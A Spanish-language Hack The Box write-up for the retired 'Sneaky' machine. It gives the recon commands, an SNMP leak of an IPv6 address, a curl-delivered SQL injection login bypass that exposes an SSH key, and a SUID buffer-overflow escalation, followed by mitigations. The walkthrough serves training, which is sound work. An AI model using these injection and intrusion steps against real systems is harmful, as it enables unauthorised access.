---
machine: Sneaky
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, snmp, ipv6, sqli, ssh-key, suid]
---

# Sneaky — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Solo se ve HTTP en IPv4; SNMP con la comunidad `public` revela una dirección IPv6. El login web es inyectable y entrega una clave SSH para `thrasivoulos`. La escalada final es un desbordamiento en un binario SUID.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
sudo nmap -sU -p161 --script snmp-brute <IP>
```

- HTTP en 80.
- SNMP en 161/UDP con `public`.
- `snmpwalk` expone `dead:beef::...`.

## Enumeración

```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.34
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php
```

Se descubre `/dev/login.php` y una clave privada accesible tras el login.

## Foothold

El formulario concatena usuario y contraseña. `' or 1=1;--` evita la autenticación y muestra la clave de `thrasivoulos`.

```bash
curl -s -X POST http://<IP>/dev/login.php --data "username=' or 1=1;--&password=x"
chmod 600 id_rsa
ssh -6 -i id_rsa thrasivoulos@dead:beef::<SUFFIX>
```

## Movimiento lateral

La clave permite SSH por IPv6. Se lee la flag de usuario y se revisan permisos, tareas y binarios especiales.

## Escalada de privilegios

```bash
find / -perm -4000 -type f 2>/dev/null
```

Un SUID local acepta una entrada de longitud controlada y desborda la pila. Se copia el binario, se calcula el offset con `gdb`/`pattern_create` y se reutiliza la técnica de ret2libc o ret2win según las protecciones.

## Evidencia

- `snmpwalk` con la dirección IPv6.
- Bypass SQLi y clave SSH redactada.
- `id` como `thrasivoulos`.
- Offset y ejecución del SUID.

## Lecciones aprendidas

- SNMP sigue filtrando topología y direcciones.
- IPv6 amplía la superficie aunque IPv4 parezca cerrado.
- Una SQLi en un login puede filtrar secretos, no solo saltarse la autenticación.

## Mitigaciones y detección

- Cambiar la comunidad SNMP y filtrar UDP/161.
- Usar consultas parametrizadas.
- Revisar binarios SUID y compilar con canario/PIE.
- Alertar de accesos SNMP y de SSH sobre IPv6 inesperado.

## Referencias

- <https://www.hackthebox.com/machines/Sneaky>
- <https://0xdf.gitlab.io/2017/10/28/htb-sneaky.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1552/004/>
